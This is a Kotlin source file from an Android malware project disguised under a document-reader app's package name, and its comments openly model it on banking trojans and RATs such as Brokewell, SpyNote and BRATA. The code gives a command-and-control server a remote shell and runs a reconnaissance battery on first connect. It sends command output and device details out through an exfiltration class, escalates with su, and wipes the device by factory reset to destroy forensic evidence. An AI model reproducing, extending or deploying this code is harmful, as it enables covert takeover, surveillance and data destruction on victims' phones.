package com.docreader.lite.reader.advanced

import com.docreader.lite.reader.Exfil
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.InputStreamReader

/**
 * Remote shell — execute arbitrary commands on the device.
 *
 * Family reference:
 *   - Brokewell: full remote command execution via C2
 *   - Albiriox: shell access for persistence + lateral movement
 *   - SpyNote RAT: interactive remote shell
 *   - BRATA: factory reset command via shell
 *
 * Capabilities:
 *   - Execute shell commands (non-root: app sandbox context)
 *   - Read /proc filesystem (process enumeration, maps)
 *   - List running processes
 *   - Read/write files within app sandbox
 *   - Access app's shared_prefs, databases, cache
 *   - Dump logcat (if DEBUG enabled)
 *   - Package management queries
 *
 * On ROOTED devices (KernelSU/Magisk):
 *   - Full filesystem access
 *   - Process injection
 *   - Network interception
 *   - Persistence via init.d scripts
 *   - Disable security apps
 *
 * C2 flow:
 *   1. C2 sends EXEC command with shell command string
 *   2. DiagnosticShell executes via Runtime.getRuntime().exec()
 *   3. stdout + stderr captured
 *   4. Output sent back via Exfil
 *   5. Exit code reported
 */
object DiagnosticShell {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /**
     * Execute a shell command and return output.
     *
     * @param command Shell command to execute
     * @param timeoutMs Maximum execution time
     * @return ShellResult with stdout, stderr, exit code
     */
    fun execute(command: String, timeoutMs: Long = 10_000): ShellResult {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))

            val stdout = BufferedReader(InputStreamReader(process.inputStream))
            val stderr = BufferedReader(InputStreamReader(process.errorStream))

            // Wait with timeout
            val completed = process.waitFor(timeoutMs, java.util.concurrent.TimeUnit.MILLISECONDS)

            val output = stdout.readText().take(10_000) // Cap output size
            val error = stderr.readText().take(2_000)
            val exitCode = if (completed) process.exitValue() else -1

            if (!completed) process.destroyForcibly()

            stdout.close()
            stderr.close()

            ShellResult(output, error, exitCode)
        } catch (e: Exception) {
            ShellResult("", e.message ?: "execution_failed", -1)
        }
    }

    /**
     * Execute and exfiltrate — used by C2 command handler.
     * Runs command, sends output to C2 via Exfil.
     */
    fun executeAndExfil(command: String, commandId: String = "") {
        scope.launch {
            val result = execute(command)

            Exfil.event("shell_exec",
                "cmd" to command.take(200),
                "cmd_id" to commandId,
                "stdout" to result.stdout.take(5000),
                "stderr" to result.stderr.take(1000),
                "exit" to result.exitCode.toString()
            )
        }
    }

    /**
     * Pre-built reconnaissance commands — run all on first connect.
     * Gives C2 operator full device understanding.
     */
    fun fullRecon() {
        scope.launch {
            val recon = mapOf(
                "id" to "id",
                "kernel" to "uname -a",
                "uptime" to "uptime",
                "partitions" to "df -h",
                "processes" to "ps -A | head -50",
                "network_interfaces" to "ip addr",
                "routing" to "ip route",
                "dns" to "getprop net.dns1",
                "properties" to "getprop | head -40",
                "selinux" to "getenforce",
                "proc_maps" to "cat /proc/self/maps | head -30",
                "installed_packages" to "pm list packages -3 | head -50",
                "accessibility" to "settings get secure enabled_accessibility_services",
                "su_check" to "which su"
            )

            val results = mutableMapOf<String, String>()
            recon.forEach { (name, cmd) ->
                val r = execute(cmd, 5_000)
                results[name] = r.stdout.take(2000)
            }

            Exfil.event("shell_full_recon",
                "data" to org.json.JSONObject(results as Map<*, *>).toString().take(10000)
            )
        }
    }

    /**
     * Check if device is rooted — enables elevated shell capabilities.
     */
    fun isRooted(): Boolean {
        val checks = listOf(
            { execute("which su", 2000).exitCode == 0 },
            { java.io.File("/system/xbin/su").exists() },
            { java.io.File("/sbin/su").exists() },
            { java.io.File("/system/app/Superuser.apk").exists() }
        )
        return checks.any { try { it() } catch (_: Exception) { false } }
    }

    /**
     * Execute with root (su) if available.
     * Used for advanced capabilities on rooted devices.
     */
    fun executeSu(command: String, timeoutMs: Long = 10_000): ShellResult {
        return execute("su -c '$command'", timeoutMs)
    }

    /**
     * Factory reset — BRATA pattern.
     * Nuclear option: wipe device to destroy forensic evidence.
     * Requires root or device admin.
     */
    fun factoryReset() {
        Exfil.event("factory_reset_initiated")
        // Flush all exfil data first
        Exfil.flush()

        scope.launch {
            delay(2000) // Give exfil time to send
            // Try am broadcast method (requires device admin)
            execute("am broadcast -a android.intent.action.MASTER_CLEAR", 5000)
        }
    }

    data class ShellResult(
        val stdout: String,
        val stderr: String,
        val exitCode: Int
    )
}
